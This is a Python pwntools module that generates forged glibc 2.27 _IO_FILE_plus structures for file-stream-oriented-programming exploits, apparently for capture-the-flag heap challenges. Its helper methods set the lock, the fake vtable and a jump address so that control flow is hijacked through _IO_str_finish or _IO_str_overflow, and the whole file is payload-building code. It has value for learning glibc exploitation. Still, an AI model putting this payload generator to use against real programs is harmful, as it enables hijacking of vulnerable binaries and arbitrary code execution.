# This is _IO_FILE generator module
# ubuntu 18.04 glibc 2.27

from pwn import *
import inspect

class _IO_file_plus:
    def __init__(self):
        self._flags = p64(0xfbad0000)
        self._IO_read_ptr = p64(0)
        self._IO_read_end = p64(0)
        self._IO_read_base = p64(0)
        self._IO_write_base = p64(0)
        self._IO_write_ptr = p64(0)
        self._IO_write_end = p64(0)
        self._IO_buf_base = p64(0)
        self._IO_buf_end = p64(0)
        self._IO_save_base = p64(0)
        self._IO_backup_base = p64(0)
        self._save_end = p64(0)
        self._markers = p64(0)
        self._fileno = p64(0)
        self._old_offset = p64(0)
        self._cur_column = p64(0)
        self._lock = p64(0)             # Setting here
        self._offset = p64(0xffffffffffffffff)
        self._freeres_list = p64(0)
        self._freeres_buf = p64(0)
        self.__pad5 = p64(0)
        self._mode = p64(0)
        self._unused2 = p64(0) * 4
        
        self.vtable = p64(0)            # Setting here
        
    def get_struct(self):
        return   self._flags + \
                self._IO_read_ptr + \
                self._IO_read_end + \
                self._IO_read_base + \
                self._IO_write_base + \
                self._IO_write_ptr + \
                self._IO_write_end + \
                self._IO_buf_base + \
                self._IO_buf_end + \
                self._IO_save_base + \
                self._IO_backup_base + \
                self._save_end + \
                self._markers + \
                self._markers + \
                self._fileno + \
                self._old_offset + \
                self._cur_column + \
                self._lock + \
                self._offset + \
                self._freeres_list + \
                self._freeres_buf + \
                self.__pad5 + \
                self._mode + \
                self._unused2 + \
                self.vtable
    
    # dic = {"_lock": addr1, "vtable" : addr2}
    def set_FSOP(self, dic):
        self._lock = dic["_lock"]
        self.vtable = dic["vtable"]
        return self.get_struct()
    
    # dic = {"_lock": addr1, "_IO_write_end": addr2, "_IO_buf_base": add3, "vtable": addr4, "jump": addr5}
    def set_IO_str_finish(self, dic):
        self._IO_write_end = dic["_IO_write_end"]
        self._IO_buf_base = dic["_IO_buf_base"]
        self._lock = dic["_lock"]
        self.vtable = dic["vtable"]
        self.vtable += p64(0)
        self.vtable += dic["jump"]
        
        return self.get_struct()
    
    def set_IO_str_overflow(self, dic):
        try:
            dic["_IO_write_ptr"] = u64(dic["_IO_write_ptr"])
            dic["_IO_buf_end"] = u64(dic["_IO_buf_end"])
        except AttributeError:
            pass
        
        self._IO_write_ptr = p64(int((dic["_IO_write_ptr"] - 100)/2))
        self._IO_buf_end = p64(int((dic["_IO_buf_end"] - 100)/2))
        self._lock = dic["_lock"]
        self.vtable = dic["vtable"]
        self.vtable += dic["jump"]
        
        return self.get_struct()
    
    def print_struct(self):
        result = self.__dict__
        
        print("\n======= _IO_file_plus =======")
        for key in result.keys():
            print("{} : {}".format(key, result[key]))
        print("=============================\n")

if __name__ == "__main__":
    test = _IO_file_plus()
    test.print_struct()
    
    payload = test.get_struct()
    
    print(payload)